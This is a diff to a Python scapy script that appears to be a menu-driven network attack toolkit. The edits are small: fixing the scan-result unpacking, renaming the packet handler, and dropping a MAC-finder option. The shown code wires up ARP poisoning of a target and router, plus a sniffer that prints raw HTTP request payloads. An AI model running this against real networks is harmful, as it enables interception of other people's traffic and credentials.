@@ -16,7 +16,7 @@ def network_scanner(scan_ip):
     
     broadcast_request = broadcast/request
     
-    available_machines = scapy.srp(broadcast_request,timeout=1)
+    (available_machines,unaswerd_machines) = scapy.srp(broadcast_request,timeout=1)
     available_machines.summary()
 
 def port_scanner(ip,port,result=1):
@@ -77,19 +77,18 @@ def reset_poison(target_ip,router_ip):
     scapy.send(arp_response,verbose=False,count=6)
     
 def sniff_net(interface):
-    scapy.sniff(iface=interface,store=False,prn=analyze_packets)
+    scapy.sniff(iface=interface,store=False,prn=analyze_packet)
     
-def analyze_packets(packet):
+def analyze_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load())
+            print(packet[scapy.Raw].load)
 
 operation = int(input("Select your operation!\n"
       "1-Network Scanner\n"
       "2-Port Scanner\n"
-      "3-MAC Finder\n"
-      "4-ARP Poison\n"
-      "5-Packet Sniffer\n"))
+      "3-ARP Poison\n"
+      "4-Packet Sniffer\n"))
 
 try:
     if operation == 1:
@@ -99,14 +98,10 @@ try:
         scan_ip = input("Enter ip for scan: ")
         control_ports(scan_ip)
     elif operation == 3:
-        scan_ip = input("Enter ip for scan: ")
-        target_mac = mac_finder(scan_ip)
-        print(target_mac)
-    elif operation == 4:
         target_ip = input("Enter target ip: ")
         router_ip = input("Enter router ip: ")
         arp_poison(target_ip,router_ip)
-    elif operation == 5:
+    elif operation == 4:
         network_interface = input("Enter your network interface: ")
         sniff_net(network_interface)
 except KeyboardInterrupt:
